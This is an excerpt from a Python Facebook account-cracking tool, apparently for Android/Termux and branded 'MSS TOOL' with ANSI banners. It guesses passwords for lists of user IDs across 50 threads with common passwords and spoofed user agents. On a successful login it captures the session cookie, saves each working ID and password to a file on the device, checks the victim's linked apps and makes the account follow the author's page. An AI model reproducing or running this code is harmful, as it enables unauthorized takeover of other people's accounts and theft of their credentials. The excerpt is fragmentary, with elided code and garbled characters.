...
logo3 = '   \n\x1b[1;32m  MUMT4Z SH4H SW4T1  \n\n\x1b[1;37m━━━━━━━━━━━━━━ \x1b[32;45mAB KHANX\x1b[0;m ━━━━━━━━━━━━━━━━━\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mAB KHANX\x1b[1;32mFACEBOK      : \x1b[1;34m AB KHANX\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mMR-SW4T1\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mFREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mMSS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m━━━━━━━━━━━━━━ \x1b[32;45mMUMT4Z\x1b[0;m ━━━━━━━━━━━━━━━━━\n\n       \x1b[37;41m\t WELLCOME TO MSS TOOL\x1b[0;m\n\n\x1b[1;37m━━━━━━━━━━━━━━= \x1b[32;45mLODING\x1b[0;m ━━━━━━━━━━━━━━━━━=\n'
...
def FD():
    ...
    print('\x1b[1;33m [1] SUBSCRIBE MY CHENNAL')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[SW4T1] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[SW4T1] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/KINGXMRSW4TI', {
...
\033[1;32m--------------------------------------------------
\033[1;32mCREATED BY   :  \033[1;32mAB KHANX 
\033[1;32mFACEBOK      : \033[1;32mAB KHANX
\033[1;32mGITHUB       :  \033[1;32mMR-SW4T1
\033[1;32mTOOL STATUS  :  \033[1;32mFREE
...
\033[1;32mWELLCOME TO MSS TOOL\33[1;32m
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        for love in user:
            ...
            pwx = [love[0:],love[1:],'pakistan','iloveyou','i love you']
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(AB-KHANX-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/AB-KHANX-OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(💔-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
        ...
        sys.stdout.write('\r     %s[SW4T1] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
...
xxxx = open('/sdcard/dalvik.txt','r').read().splitlines()

xxx = open('/sdcard/chrome.txt','r').read().splitlines()

xx = open('/sdcard/bbnew.txt','r').read().splitlines()

ox = open('/sdcard/hd.txt','r').read()
...
#+x+xx+xxx+ox+xxxx+ugen2+redmi))
    ...
    print(f'   \033[1;92m PAK CODE: {P}[{H}0306{P}][{H}0345{P}][{K}0310{P}][{K}92306{P}][{P}92323{P}][{K}92318{P}]')
...
#+x+xx+xxx+ox+xxxx+ugen2+redmi)
        ...
        sys.stdout.write('\r     %s[IXIDE-XD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
